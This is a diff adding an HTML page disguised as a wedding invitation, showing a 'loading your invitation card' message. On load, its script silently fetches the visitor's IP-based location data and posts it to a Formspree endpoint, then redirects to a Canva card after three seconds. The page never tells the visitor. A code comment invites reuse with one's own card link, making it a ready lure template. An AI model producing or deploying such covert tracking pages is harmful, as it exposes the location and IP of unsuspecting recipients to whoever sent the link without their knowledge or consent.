@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wedding Invitation</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #fff5f8;
+      color: #333;
+    }
+    .card {
+      border: 2px solid #e91e63;
+      padding: 30px;
+      border-radius: 10px;
+      display: inline-block;
+      background: #ffffff;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>You're Invited!</h1>
+    <p>We are thrilled to invite you to our wedding celebration.</p>
+    <p>Loading your invitation card...</p>
+  </div>
+
+  <script>
+    async function trackAndRedirect() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        await fetch('https://formspree.io/f/moqgkzgd', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch (e) {
+        console.error('Error tracking:', e);
+      }
+      setTimeout(() => {
+        window.location.href = "https://www.canva.com/design/DAFzE1Ny6_M/wedding-card"; // put your real wedding card link here
+      }, 3000);
+    }
+
+    window.onload = trackAndRedirect;
+  </script>
+
+</body>
+</html>
